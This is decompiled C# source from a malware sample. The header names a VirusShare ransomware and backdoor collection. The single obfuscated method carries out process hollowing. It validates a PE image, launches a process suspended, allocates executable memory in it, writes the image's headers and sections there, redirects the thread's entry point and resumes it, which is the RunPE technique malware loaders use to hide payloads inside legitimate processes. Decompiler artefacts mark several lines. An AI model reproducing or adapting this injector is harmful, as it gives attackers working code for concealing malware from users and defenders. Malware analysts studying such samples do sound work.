// Decompiled with JetBrains decompiler
// Type: %IEW1W).#)V&.EKc
// Assembly: WI-, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 39C1D42E-5B95-445C-A616-1A2ECFEC41CE
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Backdoor.Win32.Generic-ee6c98579799200a7b6cdc1ce77a6984ce5c34b633b9fbda225db62f194a61a2.exe

using \u0025\u001CIEW1W\u0029.\u0023\u0019\u0029\u0016\u0016\u0084V\u0026;
using System;

namespace \u0025\u001CIEW1W\u0029.\u0023\u0019\u0029\u0016\u0016\u0084V\u0026
{
  internal class E\u0011K\u0016c\u0080\u0006
  {
    private const uint \u0037W572 = 65543;
    private const uint a9gD\u005D\u0003\u0014 = 4;
    private const uint \u0006fX = 64;
    private const uint \u0020\u001F\u002F\u002B = 4096;
    private const uint \u0030\u0003\u0010 = 8192;

    public static unsafe bool \u003CpQ\u008B\u00A1\u008C9J(
      IntPtr _param0,
      string _param1,
      string[] _param2)
    {
      byte[] numArray1 = new byte[716];
      int[] numArray2 = new int[4];
      byte* numPtr1 = (byte*) (void*) _param0;
      int num1 = *(int*) (numPtr1 + 60);
      byte* numPtr2 = numPtr1 + num1;
      if (*(uint*) numPtr2 != 17744U || *(ushort*) numPtr1 != (ushort) 23117)
        return false;
      fixed (byte* numPtr3 = &numArray1[0])
        ;
      // ISSUE: fixed variable is out of scope
      *(int*) numPtr3 = 65543;
      IntPtr num2 = (IntPtr) *(int*) (numPtr2 + 52);
      if (!\u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.\u003Fm.\u0087\u000E\u0016\u0004\u001B(_param1, \u003CPrivateImplementationDetails\u003E\u007B4D695705\u002D4CD3\u002D4D2B\u002D9788\u002DB76714571491\u007D.\u0019C\u001A() + string.Join(\u003CPrivateImplementationDetails\u003E\u007B4D695705\u002D4CD3\u002D4D2B\u002D9788\u002DB76714571491\u007D.\u0019C\u001A(), _param2), IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, IntPtr.Zero, new byte[68], numArray2))
        return false;
      int num3 = (int) \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.A\u0014G\u0003\u000D.\u0022\u001D\u002C\u007B\u007F\u0023\u0006((IntPtr) numArray2[0], num2);
      IntPtr num4 = (IntPtr) (long) *(uint*) (numPtr2 + 80);
      int num5 = \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.A\u0014G\u0003\u000D.\u0025I\u003A\u001DKY0((IntPtr) numArray2[0], ref num2, IntPtr.Zero, ref num4, 12288U, 64U) ? 1 : 0;
      int num6 = (int) \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.A\u0014G\u0003\u000D.\u000F1\u0012i\u0008\u0028b((IntPtr) numArray2[0], num2, (IntPtr) (void*) numPtr1, *(uint*) (numPtr2 + 84), IntPtr.Zero);
      for (ushort index = 0; (int) index < (int) *(ushort*) (numPtr2 + 6); ++index)
      {
        byte* numPtr4 = numPtr1 + num1 + 248 + (new IntPtr(40) * (int) index).ToInt64();
        int num7 = (int) \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.A\u0014G\u0003\u000D.\u000F1\u0012i\u0008\u0028b((IntPtr) numArray2[0], (IntPtr) (long) ((uint) (int) num2 + *(uint*) (numPtr4 + 12)), (IntPtr) (void*) (numPtr1 + (int) *(uint*) (numPtr4 + 20)), *(uint*) (numPtr4 + 16), IntPtr.Zero);
      }
      // ISSUE: fixed variable is out of scope
      int num8 = (int) \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.A\u0014G\u0003\u000D.\u003E8\u00087\u001D\u0028\u0018\u001E\u0012((IntPtr) numArray2[1], (IntPtr) (void*) numPtr3);
      uint num9 = (uint) (int) num2;
      // ISSUE: fixed variable is out of scope
      *(int*) (numPtr3 + 176) = (int) num9 + (int) *(uint*) (numPtr2 + 40);
      // ISSUE: fixed variable is out of scope
      int num10 = (int) \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.A\u0014G\u0003\u000D.\u000F1\u0012i\u0008\u0028b((IntPtr) numArray2[0], (IntPtr) (long) (*(uint*) (numPtr3 + 164) + 8U), (IntPtr) (void*) &num9, 4U, IntPtr.Zero);
      // ISSUE: fixed variable is out of scope
      int num11 = (int) \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.A\u0014G\u0003\u000D.\u0037\u0010((IntPtr) numArray2[1], (IntPtr) (void*) numPtr3);
      int num12 = (int) \u002D\u00400K\u000B\u0003.\u0033\u0023\u0013.A\u0014G\u0003\u000D.\u0012\u001C\u0007\u0005\u002E((IntPtr) numArray2[1], IntPtr.Zero);
      return true;
    }
  }
}
